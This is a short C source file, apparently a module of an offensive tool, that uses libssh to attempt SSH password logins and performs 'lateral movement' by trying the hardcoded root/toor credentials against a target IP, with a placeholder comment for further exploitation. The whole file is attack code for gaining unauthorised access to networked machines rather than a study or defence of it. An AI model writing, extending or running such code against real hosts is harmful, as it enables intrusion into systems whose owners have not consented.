#include <stdio.h>
#include <stdlib.h>
#include <libssh/libssh.h>
#include "config.h"

int ssh_login(const char *ip, const char *username, const char *password) {
    ssh_session session = ssh_new();
    if(session == NULL) return -1;

    ssh_options_set(session, SSH_OPTIONS_HOST, ip);

    if(ssh_connect(session) == SSH_OK) {
        if(ssh_userauth_password(session, username, password) == SSH_AUTH_SUCCESS) {
            printf("[+] SSH login successful on %s\n", ip);
            ssh_disconnect(session);
            ssh_free(session);
            return 1;
        }
    }

    ssh_disconnect(session);
    ssh_free(session);
    return 0;
}

void lateral_move_ssh(const char *ip) {
    printf("[+] Trying lateral movement to: %s via SSH...\n", ip);

    if(ssh_login(ip, "root", "toor")) {
        printf("[+] Successly moved to: %s\n", ip);
        //implement more exploitation
    }
    else {
        printf("[!] SSH login failed for %s\n", ip);
    }
}
